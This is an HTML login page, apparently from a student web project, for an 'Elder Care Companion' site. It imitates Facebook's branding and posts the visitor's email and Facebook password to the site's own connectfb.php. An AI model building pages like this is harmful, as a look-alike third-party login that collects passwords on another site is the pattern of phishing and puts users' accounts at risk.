<!DOCTYPE html>

<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login Page | Elder Care Companion</title>
    <link rel="stylesheet" href="stylefb.css">
  </head>
  <body>
    <div class="container flex">
      <div class="facebook-page flex">
        <div class="text">
          <h1>facebook</h1>
          <p>Connect with Elder Care Companion </p>
          <p> on Facebook.</p>
        </div>
        <form method = "post" action = "connectfb.php">
          <input type="email" placeholder="Email or phone number" name= "email" required>
          <input type="password" placeholder="Password" name = "password" required>
          <div class="link">
            <button type="submit" class="login">Login</button>
            <a href="http://localhost/food%20project/Login%20&%20Signup%20Form/forgot%20password/forgot.php" class="forgot">Forgot password?</a>
          </div>
          <hr>
          
        </form>
      </div>
    </div>
  </body>
</html>